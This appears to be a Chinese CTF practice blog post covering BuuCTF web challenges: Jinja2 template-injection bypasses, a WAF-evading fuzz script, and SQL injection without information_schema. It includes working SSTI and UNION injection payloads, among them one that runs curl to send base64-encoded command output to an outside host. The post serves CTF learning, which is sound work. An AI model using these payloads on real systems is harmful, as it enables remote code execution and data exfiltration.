<!DOCTYPE html>
<html class="has-navbar-fixed-top">
<head>
    <meta charset="utf-8">
<title>BuuCTF刷题记录2 - cjM00N&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">












<link rel="icon" href="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200225213644.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato|Source+Code+Pro">
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">


<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/css/justifiedGallery.min.css">


<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">


<link rel="stylesheet" href="/css/style.css">


<script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>


    
    
    
    
    
    
<script async src="https://www.googletagmanager.com/gtag/js?id=false"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'false');
</script>


    


<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/rss.xml" title="cjM00N's blog" type="application/atom+xml">
</head>
<body>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/">
                
                    
                    <img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200225213644.png" alt="" height="28">
                    
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/archives">Archives</a>
            
            <a class="navbar-item "
               href="/categories">Categories</a>
            
            <a class="navbar-item "
               href="/tags">Tags</a>
            
            <a class="navbar-item "
               href="/friends">Friends</a>
            
            <a class="navbar-item "
               href="/about">About</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            <a class="navbar-item search" title="Search" href="javascript:;">
                <i class="fas fa-search"></i>
            </a>
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="Table of Contents">
                    <i class="fa fa-list"></i>
                </a>
                <div class="navbar-dropdown is-right">
                    
                    
                    
                    
                    <a class="navbar-item" href="#WesternCTF2018-shrine">1&nbsp;&nbsp;<b>[WesternCTF2018]shrine</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#GWCTF-2019-你的名字">2&nbsp;&nbsp;<b>[GWCTF 2019]你的名字</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#SWPU2019-Web1">3&nbsp;&nbsp;<b>[SWPU2019]Web1</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#Bypass-information-schema">3.1&nbsp;&nbsp;Bypass information_schema</a>
                    
                    
                    
                    <a class="navbar-item" href="#无列名注入">3.2&nbsp;&nbsp;无列名注入</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#CISCN-2019-初赛-Love-Math">4&nbsp;&nbsp;<b>[CISCN 2019 初赛]Love Math</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#hex2bin">4.1&nbsp;&nbsp;hex2bin</a>
                    
                    
                    
                    <a class="navbar-item" href="#从其他位置获取参数">4.2&nbsp;&nbsp;从其他位置获取参数</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#极客大挑战-2019-RCE-ME">5&nbsp;&nbsp;<b>[极客大挑战 2019]RCE ME</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#SUCTF-2019-EasyWeb">6&nbsp;&nbsp;<b>[SUCTF 2019]EasyWeb</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#绕过正则">6.1&nbsp;&nbsp;绕过正则</a>
                    
                    
                    
                    <a class="navbar-item" href="#文件上传">6.2&nbsp;&nbsp;文件上传</a>
                    
                    
                    
                    <a class="navbar-item" href="#Bypass-open-dir">6.3&nbsp;&nbsp;Bypass open_dir</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#CISCN2019-总决赛-Day2-Web1-Easyweb">7&nbsp;&nbsp;<b>[CISCN2019 总决赛 Day2 Web1]Easyweb</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#HITCON-2017-SSRFme">8&nbsp;&nbsp;<b>[HITCON 2017]SSRFme</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#极客大挑战-2019-HardSQL">9&nbsp;&nbsp;<b>[极客大挑战 2019]HardSQL</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#LCTF-2018-bestphp’s-revenge">10&nbsp;&nbsp;<b>[LCTF 2018]bestphp’s revenge</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#RoarCTF-2019-Online-Proxy">11&nbsp;&nbsp;<b>[RoarCTF 2019]Online Proxy</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#极客大挑战-2019-FinalSQL">12&nbsp;&nbsp;<b>[极客大挑战 2019]FinalSQL</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#ByteCTF-2019-EZCMS">13&nbsp;&nbsp;<b>[ByteCTF 2019]EZCMS</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#BJDCTF2020-Cookie-is-so-stable">14&nbsp;&nbsp;<b>[BJDCTF2020]Cookie is so stable</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#BJDCTF2020-EasySearch">15&nbsp;&nbsp;<b>[BJDCTF2020]EasySearch</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#BJDCTF2020-EzPHP">16&nbsp;&nbsp;<b>[BJDCTF2020]EzPHP</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#BJDCTF2020-ZJCTF，不过如此">17&nbsp;&nbsp;<b>[BJDCTF2020]ZJCTF，不过如此</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#安洵杯-2019-iamthinking">18&nbsp;&nbsp;<b>[安洵杯 2019]iamthinking</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#CSAWQual-2016-i-got-id">19&nbsp;&nbsp;<b>[CSAWQual 2016]i_got_id</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#RCTF-2019-Nextphp">20&nbsp;&nbsp;<b>[RCTF 2019]Nextphp</b></a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" title="GitHub" href="https://github.com/cjm00n/" target="_blank" rel="noopener">
                
                <i class="fab fa-github"></i>
                
            </a>
               
            <a class="navbar-item" title="RSS" href="/rss.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
               
            
        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
        BuuCTF刷题记录2
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            
            
            <time datetime="2020-03-01T03:43:37.901Z"
                itemprop="datePublished">Mar 1 2020</time> 更新
            

            
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/categories/CTF/">CTF</a>
        </span>
        
        
        <span id="busuanzi_container_page_pv" class="column is-narrow article-category">
            <i class="fas fa-eye" sytle="color:red;"></i>  热度: <span id="busuanzi_value_page_pv"></span> ℃
            
            
        </span>
        
        
    </div>
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
        
        <html><head></head><body><p>感谢glzjin师傅</p>
<a id="more"></a>

<h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><p>首先看题目</p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> flask</span><br><span class="line"><span class="hljs-keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="hljs-string">'FLAG'</span>] = os.environ.pop(<span class="hljs-string">'FLAG'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">@app.route('/')</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    <span class="hljs-keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">@app.route('/shrine/<path:shrine>')</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shrine</span><span class="hljs-params">(shrine)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">safe_jinja</span><span class="hljs-params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="hljs-string">'('</span>, <span class="hljs-string">''</span>).replace(<span class="hljs-string">')'</span>, <span class="hljs-string">''</span>)</span><br><span class="line">        blacklist = [<span class="hljs-string">'config'</span>, <span class="hljs-string">'self'</span>]</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join([<span class="hljs-string">'{{% set {}=None%}}'</span>.format(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="hljs-literal">True</span>)</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>WAF只有过滤<code>()</code>和设置<code>config</code>以及<code>self</code>为空, 而我们可以看到flag在<code>app.config</code>里面, 这里参考</p>
<p><a href="https://www.jianshu.com/p/1237c78a691c" target="_blank" rel="noopener">https://www.jianshu.com/p/1237c78a691c</a></p>
<p>没有了直接的config, 我们可以通过<code>current_app</code>来获取, 通过查阅手册, 可以发现在函数<code>url_for</code>中存在这个变量</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200214172345.png" alt></p>
<p>那么就可以通过下面的payload来获取</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{url_for.__globals__['current_app'].config}}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>同样的函数还有<code>get_flashed_messages</code></p>
<p>或者使用</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{app.__init__.__globals__.sys.modules.app.app.__dict__}}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>国外大佬的方法就比较硬核了</p>
<p><a href="https://ctftime.org/writeup/10851" target="_blank" rel="noopener">https://ctftime.org/writeup/10851</a></p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># search.py</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search</span><span class="hljs-params">(obj, max_depth)</span>:</span></span><br><span class="line">    </span><br><span class="line">    visited_clss = []</span><br><span class="line">    visited_objs = []</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">visit</span><span class="hljs-params">(obj, path=<span class="hljs-string">'obj'</span>, depth=<span class="hljs-number">0</span>)</span>:</span></span><br><span class="line">        <span class="hljs-keyword">yield</span> path, obj</span><br><span class="line">        </span><br><span class="line">        <span class="hljs-keyword">if</span> depth == max_depth:</span><br><span class="line">            <span class="hljs-keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">elif</span> isinstance(obj, (int, float, bool, str, bytes)):</span><br><span class="line">            <span class="hljs-keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">elif</span> isinstance(obj, type):</span><br><span class="line">            <span class="hljs-keyword">if</span> obj <span class="hljs-keyword">in</span> visited_clss:</span><br><span class="line">                <span class="hljs-keyword">return</span></span><br><span class="line">            visited_clss.append(obj)</span><br><span class="line">            print(obj)</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">if</span> obj <span class="hljs-keyword">in</span> visited_objs:</span><br><span class="line">                <span class="hljs-keyword">return</span></span><br><span class="line">            visited_objs.append(obj)</span><br><span class="line">        </span><br><span class="line">        <span class="hljs-comment"># attributes</span></span><br><span class="line">        <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> dir(obj):</span><br><span class="line">            <span class="hljs-keyword">if</span> name.startswith(<span class="hljs-string">'__'</span>) <span class="hljs-keyword">and</span> name.endswith(<span class="hljs-string">'__'</span>):</span><br><span class="line">                <span class="hljs-keyword">if</span> name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span>  (<span class="hljs-string">'__globals__'</span>, <span class="hljs-string">'__class__'</span>, <span class="hljs-string">'__self__'</span>,</span><br><span class="line">                                 <span class="hljs-string">'__weakref__'</span>, <span class="hljs-string">'__objclass__'</span>, <span class="hljs-string">'__module__'</span>):</span><br><span class="line">                    <span class="hljs-keyword">continue</span></span><br><span class="line">            attr = getattr(obj, name)</span><br><span class="line">            <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> visit(attr, <span class="hljs-string">'{}.{}'</span>.format(path, name), depth + <span class="hljs-number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="hljs-comment"># dict values</span></span><br><span class="line">        <span class="hljs-keyword">if</span> hasattr(obj, <span class="hljs-string">'items'</span>) <span class="hljs-keyword">and</span> callable(obj.items):</span><br><span class="line">            <span class="hljs-keyword">try</span>:</span><br><span class="line">                <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> obj.items():</span><br><span class="line">                    <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> visit(v, <span class="hljs-string">'{}[{}]'</span>.format(path, repr(k)), depth)</span><br><span class="line">            <span class="hljs-keyword">except</span>:</span><br><span class="line">                <span class="hljs-keyword">pass</span></span><br><span class="line">        </span><br><span class="line">        <span class="hljs-comment"># items</span></span><br><span class="line">        <span class="hljs-keyword">elif</span> isinstance(obj, (set, list, tuple, frozenset)):</span><br><span class="line">            <span class="hljs-keyword">for</span> i, v <span class="hljs-keyword">in</span> enumerate(obj):</span><br><span class="line">                <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> visit(v, <span class="hljs-string">'{}[{}]'</span>.format(path, repr(i)), depth)</span><br><span class="line">            </span><br><span class="line">    <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> visit(obj)</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>修改的<code>app.py</code></p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> flask</span><br><span class="line"><span class="hljs-keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request</span><br><span class="line"><span class="hljs-keyword">from</span> search <span class="hljs-keyword">import</span> search</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="hljs-string">'FLAG'</span>] = <span class="hljs-string">'TWCTF_FLAG'</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">@app.route('/')</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    <span class="hljs-keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">@app.route('/shrine/<path:shrine>')</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shrine</span><span class="hljs-params">(shrine)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">for</span> path, obj <span class="hljs-keyword">in</span> search(request, <span class="hljs-number">10</span>):</span><br><span class="line">        <span class="hljs-keyword">if</span> str(obj) == app.config[<span class="hljs-string">'FLAG'</span>]:</span><br><span class="line">            <span class="hljs-keyword">return</span> path</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="hljs-literal">True</span>)</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>通过遍历<code>request</code>来查找是否存在某个子属性和<code>app.config['FLAG']</code>是一致的, 最后找的payload是</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>其实可以看到和前面的思路是一致的, 只是获取的路径不同</p>
<h2 id="GWCTF-2019-你的名字"><a href="#GWCTF-2019-你的名字" class="headerlink" title="[GWCTF 2019]你的名字"></a>[GWCTF 2019]你的名字</h2><p>顺带就来做一下上次比赛没整出来的SSTI</p>
<p>这道题其实很明显的是模板注入, 出题人恶趣味的用了<code>index.php</code>这样的路由, 但是实际上还是一道python题</p>
<p>先来fuzz一下</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200215132546.png" alt></p>
<p>当输入为<code>class</code>的时候, 结果会被过滤, 应该是有waf</p>
<p>用<code>6</code>测一下发现还有php的报错, 这是真的sxbk</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200215132658.png" alt></p>
<p>但是这里<code></code>是用不了了</p>
<p>我们上网查一下就会发现, 在ssti中过滤了<code></code>后, 可以通过<code>{\%</code>外带</p>
<p><a href="https://xz.aliyun.com/t/6885#toc-4" target="_blank" rel="noopener">Python模板注入(SSTI)深入学习</a></p>
<p>上面链接中的payload改一下就可以用</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://xx.xxx.xx.xx:8080/?i=`ls /`') %}1{% endif %}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>但是还有一个问题是有关键字符的过滤, 上网找一下ssti的字典 <del>当然是没找到了</del></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200215135402.png" alt></p>
<p>可以发现双写绕不过, 应该是循环匹配, 替换为空的话我们可以利用这个特点来绕过, 但是这里毫无提示, 感觉只能纯靠猜, 找到一个词符合以下条件</p>
<ul>
<li>在<code>ban_list</code>中尽量靠后</li>
<li>不出现在我们的payload里面</li>
</ul>
<p>由于第一个是黑箱, 我们只能从第二个入手</p>
<p>fuzz脚本</p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> re</span><br><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep</span><br><span class="line">url = <span class="hljs-string">"http://f9fd3c30-c575-4a29-88a3-680ebc168df5.node3.buuoj.cn"</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_words</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    f = open(<span class="hljs-string">"ssti_payload.txt"</span>, <span class="hljs-string">"r"</span>).read()</span><br><span class="line">    words = re.findall(<span class="hljs-string">"[a-zA-Z]+"</span>, f)</span><br><span class="line">    f = open(<span class="hljs-string">"ssti_word.txt"</span>, <span class="hljs-string">"w"</span>)</span><br><span class="line">    res = sorted(list(set(words)))</span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:</span><br><span class="line">        f.write(i + <span class="hljs-string">"\n"</span>)</span><br><span class="line">    <span class="hljs-keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find_unused_word</span><span class="hljs-params">(words, payload)</span>:</span></span><br><span class="line">    used_word = list(set(re.findall(<span class="hljs-string">"[a-zA-Z]+"</span>, payload)))</span><br><span class="line">    <span class="hljs-keyword">return</span> [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> words <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> used_word]</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuzz</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    payload = <span class="hljs-string">"{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://xx.xxx.xx.xx:8080/?i=`ls /`') %}1{% endif %}"</span></span><br><span class="line">    words = gen_words()</span><br><span class="line">    unused_word = find_unused_word(words, payload)</span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> unused_word:</span><br><span class="line">        data = {</span><br><span class="line">            <span class="hljs-string">"name"</span>: i</span><br><span class="line">        }</span><br><span class="line">        res = requests.post(url, data=data).text</span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-string">"hello !"</span> <span class="hljs-keyword">in</span> res: </span><br><span class="line">            data = {</span><br><span class="line">                <span class="hljs-string">"name"</span>: <span class="hljs-string">"cla"</span> + i + <span class="hljs-string">"ss"</span></span><br><span class="line">            }</span><br><span class="line">            res = requests.post(url, data=data).text</span><br><span class="line">            <span class="hljs-keyword">if</span> <span class="hljs-string">"class"</span> <span class="hljs-keyword">in</span> res:</span><br><span class="line">                print(<span class="hljs-string">f"[*] find <span class="hljs-subst">{i}</span>"</span>)</span><br><span class="line">        sleep(<span class="hljs-number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:</span><br><span class="line">    fuzz()</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200215141705.png" alt></p>
<p>由于结果只有几个, 我们挨个试一下, 就会发现<code>config</code>是可用的</p>
<p>使用小号开一个<code>Linux labs</code></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200215142006.png" alt></p>
<p>之后再改造一下payload</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{% iconfigf ''.__claconfigss__.__mrconfigo__[2].__subclaconfigsses__()[59].__init__.func_gloconfigbals.linecconfigache.oconfigs.popconfigen('curl http://174.0.167.222:2333/ -d `ls /|base64`') %}1{% endiconfigf %}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>注意这里最后必须要是<code>endiconfigf</code>, 不是很懂为什么, 猜测是要和前面的<code>iconfigf</code>一致吧, 其他的情况都会导致打不通</p>
<p>然后我们就可以rce了, 由于返回只有一行, 就拼接了个<code>|base64</code></p>
<p><img src="assets/image-20200215142906296.png" alt="image-20200215142906296"></p>
<h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>这题咋一看还以为是个XSS—-</p>
<p>但是这管理员一直不确认的就很迷惑了</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200215143831.png" alt></p>
<p>然后查了一下才发现不是XSS是个SQL题</p>
<p>可以看到注入点有几个, 比如申请广告这里</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200215144214.png" alt></p>
<p>还有查看的时候</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200215144240.png" alt></p>
<p>测试一下发现<code>id</code>那里打不通, 就回到广告这里, 顺利的看到了注入点</p>
<p>当然这丧心病狂的22列是真的顶</p>
<p>首先可以看到<code></code>被过滤, 直接使用<code>/**/</code>或者<code>(</code>就可以绕过了, 主要是下面两点</p>
<h3 id="Bypass-information-schema"><a href="#Bypass-information-schema" class="headerlink" title="Bypass information_schema"></a>Bypass information_schema</h3><p>做过sqli的都知道这个库的厉害, 但是现在也经常被过滤 (例如过滤<code>or</code>), 那么我们就需要新的姿势了</p>
<p><a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193512</a></p>
<p><a href="https://www.cnblogs.com/wangtanzhi/p/12241499.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12241499.html</a></p>
<p>可以看到大部分是用了<code>sys.schema_auto_increment_columns</code>这个库</p>
<p>由于在Buuoj上面没有这个库, 这里用的姿势是</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>这样来获取表名</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200215181737.png" alt></p>
<h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><p>先回顾一下我们常规的思路, 一般我们是通过<code>information_schema.columns</code>注入出所有列名再进行查询, 而这里我们用不了这个库, 就可以考虑无列名注入</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3;</span><br></pre></td></tr></tbody></table></figure><p></p>
